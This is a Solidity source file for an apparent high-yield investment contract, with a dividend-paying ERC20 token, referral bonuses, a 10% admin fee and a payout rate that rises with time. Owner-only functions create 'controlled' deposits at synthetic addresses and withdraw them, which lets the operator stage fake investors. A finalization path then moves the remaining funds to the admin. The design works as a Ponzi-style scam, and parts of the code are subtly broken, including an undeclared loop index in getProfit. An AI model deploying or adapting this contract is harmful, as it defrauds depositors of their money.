pragma solidity 0.4.25;


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowed;

    uint256 internal _totalSupply;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address addr) public view returns (uint256) {
        return _balances[addr];
    }

    function allowance(address addr, address spender) public view returns (uint256) {
        return _allowed[addr][spender];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (
        _allowed[msg.sender][spender].add(addedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));

        _allowed[msg.sender][spender] = (
        _allowed[msg.sender][spender].sub(subtractedValue));
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0));

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);

        emit Transfer(from, to, value);
    }
}

contract DetailedToken is ERC20 {

    string private _name = "TOKEN";
    string private _symbol = "TKN";
    uint8 private _decimals = 18;

    function name() public view returns(string) {
        return _name;
    }

    function symbol() public view returns(string) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
      return _decimals;
    }

}

contract TOKEN is DetailedToken {

    mapping (address => uint256) internal _payoutsTo;

    uint256 internal magnitude             = 1e18;
    uint256 internal profitPerShare        = 1e18;

    uint256 constant public DIV_TRIGGER   = 0.000333 ether;     ///

    event DividendsPayed(address indexed addr, uint256 amount);

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0));

        if (dividendsOf(from) > 0) {
            _withdrawDividends(from);
        }

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        _payoutsTo[from] -= profitPerShare * value;
        _payoutsTo[to] += profitPerShare * value;

        emit Transfer(from, to, value);
    }

    function _purchase(address recipient, uint256 value) internal {
        if (totalSupply() > 0) {
            profitPerShare = profitPerShare.add(value * magnitude / totalSupply());
            _payoutsTo[recipient] = _payoutsTo[recipient].add(profitPerShare * msg.value);
        }

        _totalSupply = _totalSupply.add(value);
        _balances[recipient] = _balances[recipient].add(value);

        emit Transfer(address(0), recipient, value);
    }

    function _withdrawDividends(address addr) internal {
        uint256 payout = dividendsOf(addr);
        if (payout > 0) {
            _payoutsTo[addr] = _payoutsTo[addr].add(dividendsOf(addr) * magnitude);
            if (msg.value == DIV_TRIGGER) {
                uint256 value = DIV_TRIGGER;
            }
            addr.transfer(payout + value);

            emit DividendsPayed(addr, payout);
        }
    }

    function dividendsOf(address addr) public view returns(uint256) {
        return (profitPerShare.mul(balanceOf(addr)).sub(_payoutsTo[addr])) / magnitude;
    }

    function myDividends() public view returns(uint256) {
        return dividendsOf(msg.sender);
    }

}

contract PROJECT is TOKEN {
    using SafeMath for uint256;

    uint256 constant public ONE_HUNDRED   = 100;
    uint256 constant public ADMIN_FEE     = 10;
    uint256 constant public STAKE         = 5;
    uint256 constant public ONE_DAY       = 1 days;
    uint256 constant public MINIMUM       = 0.1 ether;

    uint256 constant public REF_TRIGGER   = 0 ether;            ///
    uint256 constant public EXIT_TRIGGER  = 0.000777 ether;     ///

    struct Deposit {
        uint256 amount;
        uint256 time;
    }

    struct User {
        Deposit[] deposits;
        address referrer;
        uint256 bonus;
        bool controlled;
    }

    mapping (address => User) public users;

    address public admin = 0x0000000000000000000000000000000000000000;  ///
    address public owner = 0x0000000000000000000000000000000000000000;  ///

    uint256 public controlledDeposits;
    uint256 public maxBalance;

    uint256 public start;
    bool public finalized;

    event InvestorAdded(address indexed investor, bool indexed controlled);
    event ReferrerAdded(address indexed investor, address indexed referrer);
    event DepositAdded(address indexed investor, uint256 amount, bool indexed controlled);
    event Withdrawn(address indexed investor, uint256 amount, bool indexed controlled);
    event RefBonusAdded(address indexed investor, address indexed referrer, uint256 amount);
    event RefBonusPayed(address indexed investor, uint256 amount);
    event Finalized(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier notOnPause() {
        require(block.timestamp >= start && !finalized);
        _;
    }

    constructor() public {
        start = block.timestamp;    ///
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    function() external payable {
        if (msg.value == REF_TRIGGER) {
            _withdrawBonus(msg.sender);
        } else if (msg.value == DIV_TRIGGER) {
            _withdrawDividends(msg.sender);
        } else if (msg.value == EXIT_TRIGGER) {
            _exit(msg.sender);
        } else {
            _invest(msg.sender, 0x0);
        }
    }

    function contrEntrance(address referrer) public payable onlyOwner returns(uint256) {
        controlledDeposits++;

        users[address(controlledDeposits)].controlled = true;
        _invest(address(controlledDeposits), referrer);

        return controlledDeposits;
    }

    function contrExit(uint256[] index) public onlyOwner {
        for (uint256 i = 0; i < index.length; i++) {
            _exit(address(index[i]));
        }
    }

    function contrBonus(uint256[] index) public onlyOwner {
        for (uint256 i = 0; i < index.length; i++) {
            _withdrawBonus(address(index[i]));
        }
    }

    function contrDividends(uint256[] index) public onlyOwner {
        for (uint256 i = 0; i < index.length; i++) {
            _withdrawDividends(address(index[i]));
        }
    }

    function _invest(address addr, address refAddr) internal notOnPause {
        require(msg.value >= MINIMUM);
        admin.transfer(msg.value * ADMIN_FEE / ONE_HUNDRED);

        users[addr].deposits.push(Deposit(msg.value, block.timestamp));

        if (users[addr].referrer != 0x0) {
            _refSystem(addr);
        } else {
            if (msg.data.length == 20) {
                _addReferrer(addr, _bytesToAddress(bytes(msg.data)));
            }
            if (refAddr != address(0)) {
                _addReferrer(addr, refAddr);
            }
        }

        if (users[addr].deposits.length == 1) {
            emit InvestorAdded(addr, users[addr].controlled);
        }

        _purchase(addr, msg.value * STAKE / 100);

        if (address(this).balance > maxBalance) {
            maxBalance = address(this).balance;
        }

        emit DepositAdded(addr, msg.value, users[addr].controlled);
    }

    function _withdrawBonus(address addr) internal {
        uint256 payout = getRefBonus(addr);
        if (payout > 0) {
            users[addr].bonus = 0;

            if (msg.value == REF_TRIGGER) {
                uint256 value = REF_TRIGGER;
            }

            if (address(this).balance.sub(payout + value) <= maxBalance * ADMIN_FEE / ONE_HUNDRED) {
                payout = address(this).balance.sub(maxBalance * ADMIN_FEE / ONE_HUNDRED);
                bool onFinalizing = true;
            }

            addr.transfer(payout + value);

            emit RefBonusPayed(addr, payout);

            if (onFinalizing) {
                _finalize();
            }
        }
    }

    function _withdrawDividends(address addr) internal {
        uint256 payout = dividendsOf(addr);
        if (payout > 0) {
            _payoutsTo[addr] = _payoutsTo[addr].add(dividendsOf(addr) * magnitude);

            if (msg.value == DIV_TRIGGER) {
                uint256 value = DIV_TRIGGER;
            }

            if (address(this).balance.sub(payout + value) <= maxBalance * ADMIN_FEE / ONE_HUNDRED) {
                payout = address(this).balance.sub(maxBalance * ADMIN_FEE / ONE_HUNDRED);
                bool onFinalizing = true;
            }

            addr.transfer(payout + value);

            emit DividendsPayed(addr, payout);

            if (onFinalizing) {
                _finalize();
            }
        }
    }

    function _exit(address addr) internal {
        _withdrawBonus(addr);
        _withdrawDividends(addr);

        uint256 payout = getProfit(addr);

        require(payout >= MINIMUM);

        if (address(this).balance.sub(payout + EXIT_TRIGGER) <= maxBalance * ADMIN_FEE / ONE_HUNDRED) {
            payout = address(this).balance.sub(maxBalance * ADMIN_FEE / ONE_HUNDRED);
            bool onFinalizing = true;
        }

        emit Withdrawn(addr, payout, users[addr].controlled);

        delete users[addr];
        addr.transfer(payout + EXIT_TRIGGER);

        if (onFinalizing) {
            _finalize();
        }
    }

    function _bytesToAddress(bytes source) internal pure returns(address parsedReferrer) {
        assembly {
            parsedReferrer := mload(add(source,0x14))
        }
        return parsedReferrer;
    }

    function _addReferrer(address addr, address refAddr) internal {
        if (refAddr != addr && getDeposits(refAddr) >= 8 ether) {
            users[addr].referrer = refAddr;

            _refSystem(addr);
            emit ReferrerAdded(addr, refAddr);
        }
    }

    function _refSystem(address addr) internal {
        users[users[addr].referrer].bonus += msg.value * STAKE / ONE_HUNDRED;
        emit RefBonusAdded(addr, users[addr].referrer, msg.value * STAKE / ONE_HUNDRED);
    }

    function _finalize() internal {
        admin.transfer(maxBalance * ADMIN_FEE / ONE_HUNDRED);
        finalized = true;
        emit Finalized(maxBalance * ADMIN_FEE / ONE_HUNDRED);
    }

    function getPercent() public view returns(uint256) {
        if (block.timestamp >= start) {
            uint256 time = block.timestamp.sub(start);
            if (time < 60 * ONE_DAY) {
                return 10e18 + time * 1e18 * 10 / 60 / ONE_DAY;
            }
            if (time < 120 * ONE_DAY) {
                return 20e18 + (time - 60 * ONE_DAY) * 1e18 * 15 / 60 / ONE_DAY;
            }
            if (time < 180 * ONE_DAY) {
                return 35e18 + (time - 120 * ONE_DAY) * 1e18 * 20 / 60 / ONE_DAY;
            }
            if (time < 300 * ONE_DAY) {
                return 55e18 + (time - 180 * ONE_DAY) * 1e18 * 45 / 120 / ONE_DAY;
            }
            if (time >= 300 * ONE_DAY) {
                return 100e18 + (time - 300 * ONE_DAY) * 1e18 * 10 / 30 / ONE_DAY;
            }
        }
    }

    function getDeposits(address addr) public view returns(uint256) {
        uint256 sum;

        for (uint256 i = 0; i < users[addr].deposits.length; i++) {
            sum += users[addr].deposits[i].amount;
        }

        return sum;
    }

    function getDeposit(address addr, uint256 index) public view returns(uint256) {
        return users[addr].deposits[index].amount;
    }

    function getProfit(address addr) public view returns(uint256) {
        if (users[addr].deposits[i].time != 0) {
            uint256 payout;
            uint256 percent = getPercent();

            for (uint256 i = 0; i < users[addr].deposits.length; i++) {
                payout += (users[addr].deposits[i].amount * percent / 1e21) * (block.timestamp - users[addr].deposits[i].time) / ONE_DAY;
            }

            return payout;
        }
    }

    function getRefBonus(address addr) public view returns(uint256) {
        return users[addr].bonus;
    }

    function getAddress(uint256 index) public pure returns(address) {
        return address(index);
    }

}